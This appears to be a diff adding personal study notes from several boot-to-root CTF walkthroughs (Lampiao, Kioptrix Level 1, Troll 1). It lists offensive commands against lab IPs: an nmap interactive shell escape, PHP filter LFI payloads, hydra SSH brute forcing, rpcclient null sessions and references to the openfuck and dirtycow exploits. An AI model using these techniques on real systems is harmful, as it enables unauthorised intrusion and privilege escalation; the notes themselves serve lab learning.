@@ -59,3 +59,64 @@ Nmap interactive mode
 nmap —interactive
 !sh
 
+
+https://youtu.be/pgfYKUXGhOY?si=QnKh7hW3TxZI9qzV
+Lampiao CTF Walkthrough - Boot-To-Root
+
+============================== Learned ==============================
+
+cewl tool to generate wordlists from site to make It a calculate wordlists
+cewl http://192.168.1.106:1898/?q=node=1 -w wordlist.txt
+
+https://github.com/InteliSecureLabs/Linux_Exploit_Suggester
+wget https://github.com/InteliSecureLabs/Linux_Exploit_Suggester in vulnerable machine
+
+If there is functionality to change language in website and it is allowing then there may probably be a Lfi vulnerability
+
+Php encoder
+=php://filter/conver.base64-encode/resource=shell
+=php://filter/conver.base64-encode/resource=index
+
+sudo -l
+Shows all the file that can be run with root permission
+
+https://github.com/0x00-0x00/FakePip
+
+
+
+
+https://youtu.be/Qn2cKYZ6kBI?si=dn8GLSQzOf9SlNzA
+
+Kioptrix Level 1 CTF Walkthrough - Boot-To-Root
+
+============================== Learned ==============================
+
+First 
+nmap -sV -A 192.X.X.X.X
+Then 
+Intense scan
+Then
+Udp ports
+
+
+rpcclient -U “” 192.x.x.x 
+openfuckv2.c remote buffer overflow
+
+/usr/share/exploitdb/exploits/unix/remote/764.c
+
+
+
+https://youtu.be/IXC-05KGeGg?si=0ogpQ7FgbyE29B-o
+
+Troll 1 CTF Walkthrough - Boot-To-Root
+
+============================== Learned ==============================
+
+hydra -V -L which_one_lol.txt -p Pass.txt ssh://192.x.x.x
+
+dirtycow2 
+
+
+
+
+
